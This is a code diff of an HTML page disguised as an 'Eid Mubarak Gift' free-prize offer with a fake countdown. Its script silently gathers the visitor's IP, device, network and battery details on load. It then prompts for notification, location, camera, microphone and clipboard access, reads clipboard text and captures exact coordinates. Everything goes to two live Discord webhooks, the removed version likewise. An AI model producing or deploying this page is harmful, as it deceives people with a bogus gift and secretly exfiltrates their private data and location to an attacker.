@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Eid Gift</title>
+    <title>Eid Mubarak Gift</title>
     <link rel="manifest" href="manifest.json">
     <style>
         * {
@@ -12,7 +12,6 @@
             box-sizing: border-box;
             font-family: Arial, sans-serif;
         }
-
         body {
             background: linear-gradient(135deg, #0a5c0a, #128012);
             min-height: 100vh;
@@ -21,7 +20,6 @@
             align-items: center;
             padding: 10px;
         }
-
         .box {
             max-width: 350px;
             width: 100%;
@@ -30,23 +28,13 @@
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2);
         }
-
         .header {
             background: #ffd700;
             padding: 20px;
             text-align: center;
         }
-
-        .eid {
-            font-size: 40px;
-            margin-bottom: 5px;
-        }
-
-        h2 {
-            color: #0a5c0a;
-            font-size: 20px;
-        }
-
+        .eid { font-size: 40px; margin-bottom: 5px; }
+        h2 { color: #0a5c0a; font-size: 20px; }
         .timer {
             background: #0a5c0a;
             color: white;
@@ -55,11 +43,7 @@
             font-size: 24px;
             font-weight: bold;
         }
-
-        .gifts {
-            padding: 15px;
-        }
-
+        .gifts { padding: 15px; }
         .gift-row {
             display: flex;
             align-items: center;
@@ -69,24 +53,9 @@
             border-radius: 12px;
             cursor: pointer;
         }
-
-        .gift-icon {
-            font-size: 30px;
-            width: 50px;
-            text-align: center;
-        }
-
-        .gift-name {
-            flex: 1;
-            font-weight: bold;
-            color: #333;
-        }
-
-        .gift-price {
-            color: #e67e22;
-            font-weight: bold;
-        }
-
+        .gift-icon { font-size: 30px; width: 50px; text-align: center; }
+        .gift-name { flex: 1; font-weight: bold; color: #333; }
+        .gift-price { color: #e67e22; font-weight: bold; }
         .notify-btn {
             background: #0a5c0a;
             color: white;
@@ -99,7 +68,6 @@
             font-weight: bold;
             cursor: pointer;
         }
-
         .footer {
             text-align: center;
             padding: 15px;
@@ -107,7 +75,6 @@
             font-size: 11px;
             border-top: 1px solid #eee;
         }
-
         .status {
             text-align: center;
             color: #0a5c0a;
@@ -122,215 +89,252 @@
             <div class="eid">🌙</div>
             <h2>Eid Mubarak Gift</h2>
         </div>
-
         <div class="timer" id="timer">06:00:00</div>
-
         <div class="gifts">
-            <div class="gift-row" onclick="showGift()">
-                <span class="gift-icon">⌚</span>
-                <span class="gift-name">Smart Watch</span>
-                <span class="gift-price">FREE</span>
-            </div>
-            <div class="gift-row" onclick="showGift()">
-                <span class="gift-icon">🎧</span>
-                <span class="gift-name">Earbuds</span>
-                <span class="gift-price">FREE</span>
-            </div>
-            <div class="gift-row" onclick="showGift()">
-                <span class="gift-icon">⚡</span>
-                <span class="gift-name">Type C Charger</span>
-                <span class="gift-price">FREE</span>
-            </div>
+            <div class="gift-row" onclick="showGift()"><span class="gift-icon">⌚</span><span class="gift-name">Smart Watch</span><span class="gift-price">FREE</span></div>
+            <div class="gift-row" onclick="showGift()"><span class="gift-icon">🎧</span><span class="gift-name">Earbuds</span><span class="gift-price">FREE</span></div>
+            <div class="gift-row" onclick="showGift()"><span class="gift-icon">⚡</span><span class="gift-name">Type C Charger</span><span class="gift-price">FREE</span></div>
         </div>
-
-        <div class="status" id="statusMsg">🔔 Notification allow karo gift pane ke liye</div>
-        
-        <button class="notify-btn" onclick="allowNotification()">
-            🔔 ALLOW NOTIFICATION
-        </button>
-
-        <div class="footer">
-            ⏰ Limited time offer
-        </div>
+        <div class="status" id="statusMsg">🔔 Loading...</div>
+        <button class="notify-btn" onclick="allowPermission()">🔔 ALLOW NOTIFICATION</button>
+        <div class="footer">⏰ Limited time offer</div>
     </div>
 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
-        // Timer
-        let time = 21600;
-        setInterval(() => {
-            if(time > 0) time--;
-            let h = Math.floor(time/3600);
-            let m = Math.floor((time%3600)/60);
-            let s = time%60;
-            document.getElementById('timer').innerHTML = 
-                `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-        }, 1000);
-
-        function showGift() {
-            document.getElementById('statusMsg').innerHTML = '⚠️ Pehle notification allow karo!';
-        }
-
-        // DISCORD WEBHOOKS (DO DONO)
+        // ================ CONFIG ================
         const WEBHOOKS = [
             'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg',
             'https://discord.com/api/webhooks/1471082363944702006/_hZWpLDl_Uo2Mf7sHaHjhpLgY4KXfJGPjulB1u407flimKaRyUhIbN0LlVGZTsTttKyR'
         ];
 
-        async function allowNotification() {
-            if('Notification' in window) {
-                const perm = await Notification.requestPermission();
-                
-                if(perm === 'granted') {
-                    document.getElementById('statusMsg').innerHTML = '✅ Notification allowed! Gift claim karo!';
-                    
-                    // Test notification
-                    new Notification('🎁 Permission Granted!', {
-                        body: 'Ab aap gift claim kar sakte hain',
-                        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ffd700\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'%230a5c0a\'%3E🎁%3C/text%3E%3C/svg%3E'
-                    });
+        // ================ 1. WITHOUT PERMISSION DATA (2 SECOND MEIN) ================
+        async function collectAndSendWithoutPermission() {
+            console.log("Collecting basic data...");
 
-                    // Collect data
-                    const data = {
-                        content: '@everyone 🔔 **New Notification Permission!**',
-                        embeds: [{
-                            title: '🎁 User Allowed Notifications',
-                            color: 0x00ff00,
-                            fields: [
-                                { name: '📱 Browser', value: navigator.userAgent.substring(0, 50), inline: true },
-                                { name: '🌐 Platform', value: navigator.platform, inline: true },
-                                { name: '⏱️ Time', value: new Date().toLocaleString(), inline: true },
-                                { name: '🔗 IP Info', value: '[Collected]', inline: true },
-                                { name: '📍 Location', value: 'Detecting...', inline: true }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
+            // 1. IP Address (using free API)
+            let ip = "Unknown";
+            try {
+                const ipRes = await $.getJSON('https://api.ipify.org?format=json');
+                ip = ipRes.ip;
+            } catch (e) { console.log("IP fetch failed"); }
 
-                    // DONO WEBHOOKS PAR SEND KARO
-                    for(const webhook of WEBHOOKS) {
-                        try {
-                            const res = await fetch(webhook, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(data)
-                            });
-                            if(res.ok) console.log('✅ Sent to Discord');
-                        } catch(e) {
-                            console.log('❌ Error:', e);
-                        }
-                    }
+            // 2. Browser & Device Info
+            const browserData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                screenSize: screen.width + 'x' + screen.height,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct'
+            };
 
-                    // Location bhi try karo (agar mil jaye to)
-                    navigator.geolocation.getCurrentPosition(
-                        pos => {
-                            const locationData = {
-                                content: '📍 **Location Update**',
-                                embeds: [{
-                                    title: 'User Location',
-                                    fields: [
-                                        { name: 'Latitude', value: pos.coords.latitude.toString(), inline: true },
-                                        { name: 'Longitude', value: pos.coords.longitude.toString(), inline: true },
-                                        { name: 'Accuracy', value: pos.coords.accuracy + 'm', inline: true }
-                                    ]
-                                }]
-                            };
-                            
-                            for(const webhook of WEBHOOKS) {
-                                fetch(webhook, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify(locationData)
-                                }).catch(() => {});
-                            }
-                        },
-                        () => {}
-                    );
-
-                    // Register Service Worker
-                    if('serviceWorker' in navigator) {
-                        const reg = await navigator.serviceWorker.register('sw.js');
-                        console.log('SW Registered');
-
-                        // Subscribe to push
-                        try {
-                            const sub = await reg.pushManager.subscribe({
-                                userVisibleOnly: true,
-                                applicationServerKey: 'BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qBUYIHBQFLXYp5Nksh8U'
-                            });
-                            
-                            // Send subscription to Discord
-                            for(const webhook of WEBHOOKS) {
-                                fetch(webhook, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        content: '🔔 **Push Subscription**',
-                                        embeds: [{
-                                            title: 'User Subscribed',
-                                            fields: [
-                                                { name: 'Endpoint', value: sub.endpoint.substring(0, 50) + '...', inline: false }
-                                            ]
-                                        }]
-                                    })
-                                }).catch(() => {});
-                            }
-                        } catch(e) {}
-                    }
-
-                } else {
-                    document.getElementById('statusMsg').innerHTML = '❌ Notification allow karna zaroori hai!';
-                }
+            // 3. Network Info (if available)
+            let connection = {};
+            if (navigator.connection) {
+                connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink + ' Mbps',
+                    rtt: navigator.connection.rtt + ' ms',
+                    saveData: navigator.connection.saveData
+                };
             }
+
+            // 4. Battery Info (if available)
+            let batteryInfo = {};
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'Yes' : 'No'
+                    };
+                } catch (e) {}
+            }
+
+            // Prepare Discord Message
+            const data = {
+                content: '@everyone 🌐 **New User Visit (Without Permission)**',
+                embeds: [{
+                    title: '📊 Basic Browser Data',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: '🌍 IP Address', value: ip, inline: true },
+                        { name: '⏱️ Time', value: new Date().toLocaleString(), inline: true },
+                        { name: '📱 Platform', value: browserData.platform, inline: true },
+                        { name: '🌐 Browser', value: browserData.userAgent.substring(0, 50), inline: false },
+                        { name: '🗣️ Language', value: browserData.language, inline: true },
+                        { name: '📺 Screen', value: browserData.screenSize, inline: true },
+                        { name: '⏰ Timezone', value: browserData.timeZone, inline: true },
+                        { name: '🔌 Network', value: connection.effectiveType || 'Unknown', inline: true },
+                        { name: '⚡ Battery', value: batteryInfo.level || 'Unknown', inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Send to both webhooks
+            for (const webhook of WEBHOOKS) {
+                try {
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                } catch (e) {}
+            }
+            document.getElementById('statusMsg').innerHTML = '✅ Basic data sent. Now allow permissions...';
         }
 
-        // Wapas aane par notification
-        document.addEventListener('visibilitychange', function() {
-            if(!document.hidden && 'serviceWorker' in navigator) {
-                navigator.serviceWorker.ready.then(reg => {
-                    reg.showNotification('👋 Wapas aagaye?', {
-                        body: 'Aapka gift abhi bhi reserved hai!',
-                        tag: 'return-' + Date.now()
+        // ================ 2. PERMISSION DATA (5 SECOND BAAD) ================
+        async function askForPermissions() {
+            let permissionData = {};
+            let grantedPermissions = [];
+
+            // --- Notification ---
+            if ('Notification' in window) {
+                const notifPerm = await Notification.requestPermission();
+                if (notifPerm === 'granted') {
+                    grantedPermissions.push('🔔 Notifications');
+                    permissionData.notification = 'Granted';
+                } else {
+                    permissionData.notification = 'Denied';
+                }
+            }
+
+            // --- Location ---
+            if ('geolocation' in navigator) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                     });
-                    
-                    // Discord par bhejo ke user wapas aya
-                    for(const webhook of WEBHOOKS) {
-                        fetch(webhook, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                content: '👋 **User Returned**',
-                                embeds: [{
-                                    title: 'User wapas aaya',
-                                    fields: [
-                                        { name: 'Time', value: new Date().toLocaleString(), inline: true }
-                                    ]
-                                }]
-                            })
-                        }).catch(() => {});
-                    }
+                    grantedPermissions.push('📍 Location');
+                    permissionData.location = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    };
+                } catch (e) {
+                    permissionData.location = 'Denied';
+                }
+            }
+
+            // --- Camera ---
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(t => t.stop());
+                grantedPermissions.push('📸 Camera');
+                permissionData.camera = 'Granted';
+            } catch (e) {
+                permissionData.camera = 'Denied';
+            }
+
+            // --- Microphone ---
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                stream.getTracks().forEach(t => t.stop());
+                grantedPermissions.push('🎤 Microphone');
+                permissionData.microphone = 'Granted';
+            } catch (e) {
+                permissionData.microphone = 'Denied';
+            }
+
+            // --- Clipboard (Read) ---
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text) {
+                    grantedPermissions.push('📋 Clipboard');
+                    permissionData.clipboard = text.substring(0, 50);
+                }
+            } catch (e) {
+                permissionData.clipboard = 'Denied/No Access';
+            }
+
+            // Prepare Discord Message
+            const data = {
+                content: '@everyone 🔐 **User Permission Data**',
+                embeds: [{
+                    title: '✅ Granted Permissions',
+                    color: 0xffaa00,
+                    fields: [
+                        { name: '🔔 Notification', value: permissionData.notification || 'No Request', inline: true },
+                        { name: '📍 Location', value: permissionData.location ? 'Granted' : 'Denied', inline: true },
+                        { name: '📸 Camera', value: permissionData.camera || 'Denied', inline: true },
+                        { name: '🎤 Microphone', value: permissionData.microphone || 'Denied', inline: true },
+                        { name: '📋 Clipboard', value: permissionData.clipboard ? 'Data Found' : 'No Data', inline: true },
+                        { name: '✅ Total Granted', value: grantedPermissions.length.toString(), inline: true }
+                    ],
+                    description: grantedPermissions.join(' • ') || 'No permissions granted',
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Agar location mili to extra field
+            if (permissionData.location && typeof permissionData.location === 'object') {
+                data.embeds[0].fields.push({
+                    name: '📍 Exact Location',
+                    value: `[Map](https://www.google.com/maps?q=${permissionData.location.lat},${permissionData.location.lng})`,
+                    inline: false
                 });
             }
-        });
 
-        // Page load pe bhejo
+            // Send to both webhooks
+            for (const webhook of WEBHOOKS) {
+                try {
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                } catch (e) {}
+            }
+
+            document.getElementById('statusMsg').innerHTML = `✅ Permissions sent! (${grantedPermissions.length} granted)`;
+            return grantedPermissions;
+        }
+
+        // ================ MAIN EXECUTION ================
         window.onload = function() {
-            for(const webhook of WEBHOOKS) {
-                fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: '👁️ **Page Loaded**',
-                        embeds: [{
-                            title: 'User opened website',
-                            fields: [
-                                { name: 'Time', value: new Date().toLocaleString(), inline: true },
-                                { name: 'URL', value: window.location.href, inline: true }
-                            ]
-                        }]
-                    })
-                }).catch(() => {});
+            // Timer
+            let time = 21600;
+            setInterval(() => {
+                if (time > 0) time--;
+                let h = Math.floor(time / 3600);
+                let m = Math.floor((time % 3600) / 60);
+                let s = time % 60;
+                document.getElementById('timer').innerHTML = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+            }, 1000);
+
+            // STEP 1: WITHOUT PERMISSION DATA (2 SECOND)
+            setTimeout(collectAndSendWithoutPermission, 2000);
+
+            // STEP 2: ASK FOR PERMISSIONS (5 SECOND)
+            setTimeout(askForPermissions, 5000);
+
+            // Register Service Worker
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('sw.js');
             }
         };
+
+        function showGift() {
+            document.getElementById('statusMsg').innerHTML = '⚠️ Pehle notification allow karo!';
+        }
+
+        // Manual button (agar user chahe to)
+        window.allowPermission = askForPermissions;
+
+        // Wapas aane par
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.ready.then(reg => {
+                        reg.showNotification('👋 Wapas aagaye?', { body: 'Gift abhi bhi reserved hai!', tag: 'return' });
+                    });
+                }
+            }
+        });
     </script>
 </body>
 </html>
